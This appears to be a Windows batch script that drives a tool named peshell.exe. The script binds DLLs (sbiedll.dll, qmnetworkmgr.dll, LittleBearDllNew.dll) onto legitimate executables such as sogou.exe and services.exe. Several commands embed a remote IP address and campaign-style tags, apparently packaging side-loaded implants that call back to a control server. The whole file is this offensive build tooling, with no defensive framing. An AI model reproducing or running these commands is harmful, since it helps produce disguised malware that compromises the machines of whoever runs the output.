rem peshell.exe -be sogou.exe sbiedll.dll -c config.txt -o test.exe
rem peshell.exe -bd sogou.exe sbiedll.dll -c config.txt -o test.dll
rem peshell.exe -b c:\windows\syswow64\calc.exe

rem peshell.exe -b sogou.exe sbiedll.dll -p 47.116.51.29 jypc20201217 -o test.dll
peshell.exe -b services.exe qmnetworkmgr.dll -p 10.43.184.204 mytest -o test.exe

rem peshell.exe -bd D:\vsproject\PEShell\work\sogou.exe D:\vsproject\PEShell\work\sbiedll.dll -p 47.116.51.29 test20190401 -dh D:\vsproject\PEShell\work\LittleBearDllNew.dll -o test.dll
rem peshell.exe -be D:\vsproject\PEShell\work\sogou.exe D:\vsproject\PEShell\work\sbiedll.dll -p 47.116.51.29 test20190401 -eh D:\vsproject\PEShell\work\LittleBearDllNew.dll -o test.exe
pause
